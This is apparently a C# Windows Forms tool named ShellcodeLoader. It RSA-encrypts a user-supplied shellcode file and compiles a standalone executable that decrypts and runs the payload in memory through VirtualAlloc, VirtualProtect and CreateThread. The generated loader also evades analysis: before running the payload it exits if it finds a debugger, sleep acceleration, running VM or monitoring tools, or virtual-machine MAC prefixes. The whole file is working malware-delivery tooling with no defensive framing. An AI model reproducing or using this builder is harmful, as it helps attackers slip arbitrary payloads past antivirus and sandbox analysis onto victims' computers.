using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.CSharp;

namespace ShellcodeLoader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public static string bobPrivateKey;
        public static string bobPublicKey;

        static string OpenFile()
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Binary Files (*.bin)|*.bin",
                InitialDirectory = Environment.CurrentDirectory,
                RestoreDirectory = true
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                FileStream fileStream = File.Open(openFileDialog.FileName, FileMode.OpenOrCreate, FileAccess.ReadWrite);
                BinaryReader binaryReader = new BinaryReader(fileStream);
                byte[] buf = binaryReader.ReadBytes(Convert.ToInt16(fileStream.Length));
                binaryReader.Close();
                fileStream.Close();
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                rsa.FromXmlString(bobPublicKey);
                string orgText = Convert.ToBase64String(buf);

                byte[] orgData = Encoding.Default.GetBytes(orgText);
                byte[] encryptedData = null;
                ArrayList arrEncrypteToTxt = new ArrayList();
                if (orgData.Length > 117)
                {
                    encryptedData = encryptedDataMethod(rsa, orgData, arrEncrypteToTxt);
                }
                else
                {
                    encryptedData = rsa.Encrypt(orgData, false);
                }

                return Convert.ToBase64String(encryptedData);

            }
            return String.Empty;
        }

        private static byte[] encryptedDataMethod(RSACryptoServiceProvider rsa, byte[] orgData, ArrayList arrEncrypteToTxt)
        {
            byte[] encryptedData = null;

            try
            {
                string strEncrypteToTxt = "";
                byte[] temp = null;
                byte[] tempEncrypedData = null;
                if (orgData.Length > 117)
                {
                    temp = new byte[117];
                    for (int i = 0; i < 117; i++)
                    {
                        temp[i] = orgData[i];
                    }
                }
                else
                {
                    temp = orgData;
                }
                tempEncrypedData = rsa.Encrypt(temp, false);
                strEncrypteToTxt = Convert.ToBase64String(tempEncrypedData);
                arrEncrypteToTxt.Add(strEncrypteToTxt);

                if (orgData.Length > 117)
                {
                    int j = 0;
                    byte[] again = new byte[orgData.Length - 117];
                    for (int i = 117; i < orgData.Length; i++)
                    {
                        again[j] = orgData[i];
                        j++;
                    }
                    return encryptedDataMethod(rsa, again, arrEncrypteToTxt);
                }
                else
                {
                    encryptedData = new byte[arrEncrypteToTxt.Count * 128];
                    Byte[] btFromBase64 = null;
                    int k = 0;
                    foreach (string strArr in arrEncrypteToTxt)
                    {
                        btFromBase64 = Convert.FromBase64String(strArr);
                        btFromBase64.CopyTo(encryptedData, k * 128);
                        k++;
                    }

                }
            }
            catch (Exception ex)
            {
                throw new Exception(ex.Message);
            }
            return encryptedData;
        }

        public static void CompileCode(int platform, string privateKey, string encryptData)
        {
            if (encryptData != "")
            {
                Dictionary<string, string> options = new Dictionary<string, string>
                {
                    { "CompilerVersion", "v4.0" }
                };
                CSharpCodeProvider provider = new CSharpCodeProvider(options);
                CompilerParameters parameters = new CompilerParameters();
                parameters.GenerateExecutable = true;
                parameters.GenerateInMemory = false;
                if (platform == 32)
                {
                    parameters.CompilerOptions = "-platform:x86";
                }
                else if (platform == 64)
                {
                    parameters.CompilerOptions = "-platform:x64";
                }
                string path = "shellcode" + platform + ".exe";
                parameters.OutputAssembly = path;
                parameters.ReferencedAssemblies.Add("System.dll");
                string sourceCode = @"
using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace shellcode
{
    class Program
    {
        static int get_current_time()
        {
            DateTime dt = DateTime.Now;
            return dt.Minute;
        }

        static bool check_sleep_acceleration()
        {
            int first = get_current_time();
            Thread.Sleep(120000);
            int second = get_current_time();
            if (second - first != 2)
            {
                return true;
            }
            return false;
        }

        static string execute_process(string file, string args = """")
        {
            Process process = new Process();
            process.StartInfo.FileName = file;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.Arguments = args;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            process.Close();
            return output;
        }

        static bool check_process_running()
        {
            string[] blacklist = { ""vmsrvc"", ""tcpview"", ""wireshark"", ""visual basic"", ""fiddler"", ""vmware"", ""vbox"", ""process explorer"", ""autoit"", ""vboxtray"", ""vmtools"", ""vmrawdsk"", ""vmusbmouse"", ""vmvss"", ""vmscsi"", ""vmxnet"", ""vmx_svga"", ""vmmemctl"", ""df5serv"", ""vboxservice"", ""vmhgfs"", ""vmtoolsd"" };
            string process = execute_process(""tasklist.exe"", ""/svc"");
            foreach (var name in blacklist)
            {
                if (process.Contains(name))
                {
                    return true;
                }
            }
            return false;
        }

        static bool checks_mac_address()
        {
            string[] blacklist = { ""080027"", ""000569"", ""000C29"", ""001C14"", ""005056"", ""001C42"", ""00163E"", ""0A0027"" };
            string mac = execute_process(""getmac.exe"").Replace(""-"", """").Replace("":"", """");
            foreach (var name in blacklist)
            {
                if (mac.Contains(name))
                {
                    return true;
                }
            }
            return false;
        }

        static void Main(string[] args)
        {
            if (Debugger.IsAttached)
            {
                Console.WriteLine(""Debugger Found"");
                Environment.Exit(0);
            }

            if (check_sleep_acceleration())
            {
                Console.WriteLine(""Sleep Found"");
                Environment.Exit(0);
            }

            if (check_process_running())
            {
                Console.WriteLine(""Process Found"");
                Environment.Exit(0);
            }

            if (checks_mac_address())
            {
                Console.WriteLine(""Mac Found"");
                Environment.Exit(0);
            }

            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            rsa.FromXmlString(""" + privateKey;
                sourceCode += @""");
            byte[] encryptedData = Convert.FromBase64String(""" + encryptData;
                sourceCode += @""");
            byte[] decryptedData = null;
            int DecryptedSize = 0;
            if (encryptedData.Length > 128)
            {
                ArrayList arrDecrypteToTxt = new ArrayList();
                decryptedData = DecryptedDataMethod(rsa, encryptedData, arrDecrypteToTxt, DecryptedSize);
            }
            else
            {
                decryptedData = rsa.Decrypt(encryptedData, false);
            }
            string payload = Encoding.Default.GetString(decryptedData);
            byte[] mydata = Convert.FromBase64String(payload);
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)mydata.Length,
                MEM_COMMIT, PAGE_READWRITE);
            Marshal.Copy(mydata, 0, (IntPtr)(funcAddr), mydata.Length);
            uint oldprotection;
            VirtualProtect((IntPtr)(funcAddr), mydata.Length, PAGE_EXECUTE, out oldprotection);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE = 0x10;
        [DllImport(""kernel32"")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport(""kernel32"")]
        static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport(""kernel32"")]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );
        [DllImport(""kernel32"")]
        private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );
        private static byte[] DecryptedDataMethod(RSACryptoServiceProvider rsa, byte[] orgData, ArrayList arrDecrypteToTxt, int DecryptedSize)
        {
            byte[] DecryptedData = null;
            try
            {
                string strDecrypteToTxt = """";
                byte[] temp = null;
                byte[] tempDecryptedData = null;
                if (orgData.Length > 128)
                {
                    temp = new byte[128];
                    for (int i = 0; i < 128; i++)
                    {
                        temp[i] = orgData[i];
                    }
                }
                else
                {
                    temp = orgData;
                }
                tempDecryptedData = rsa.Decrypt(temp, false);
                DecryptedSize += tempDecryptedData.Length;
                strDecrypteToTxt = Convert.ToBase64String(tempDecryptedData);
                arrDecrypteToTxt.Add(strDecrypteToTxt);

                if (orgData.Length > 128)
                {
                    byte[] again = new byte[orgData.Length - 128];
                    int j = 0;
                    for (int i = 128; i < orgData.Length; i++)
                    {
                        again[j] = orgData[i];
                        j++;
                    }
                    return DecryptedDataMethod(rsa, again, arrDecrypteToTxt, DecryptedSize);
                }
                else
                {
                    DecryptedData = new byte[DecryptedSize];
                    Byte[] btFromBase64 = null;

                    int p = 1;
                    int currentAddr = 0;
                    int k = 0;
                    double dk = 0;
                    dk = Math.Floor((double)(DecryptedSize / 117));
                    k = (int)dk;
                    int n = 0;
                    foreach (string strArr in arrDecrypteToTxt)
                    {
                        if (n < k)
                        {
                            btFromBase64 = Convert.FromBase64String(strArr);
                            btFromBase64.CopyTo(DecryptedData, n * 117);
                            currentAddr = p * 117;
                            p++;
                            n++;
                        }
                        else
                        {
                            btFromBase64 = Convert.FromBase64String(strArr);
                            btFromBase64.CopyTo(DecryptedData, currentAddr);
                        }

                    }
                }

            }
            catch (Exception ex)
            {
                throw new Exception(ex.Message);
            }
            return DecryptedData;
        }
    }
}
        ";
                CompilerResults cr = provider.CompileAssemblyFromSource(parameters, sourceCode);
                if (cr.Errors.Count > 0)
                {
                    MessageBox.Show("编译失败");
                }
                else
                {
                    MessageBox.Show("编译成功");
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            bobPrivateKey = rsa.ToXmlString(true);
            bobPublicKey = rsa.ToXmlString(false);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            CompileCode(32, bobPrivateKey, OpenFile());
        }

        private void button2_Click(object sender, EventArgs e)
        {
            CompileCode(64, bobPrivateKey, OpenFile());
        }
    }
}
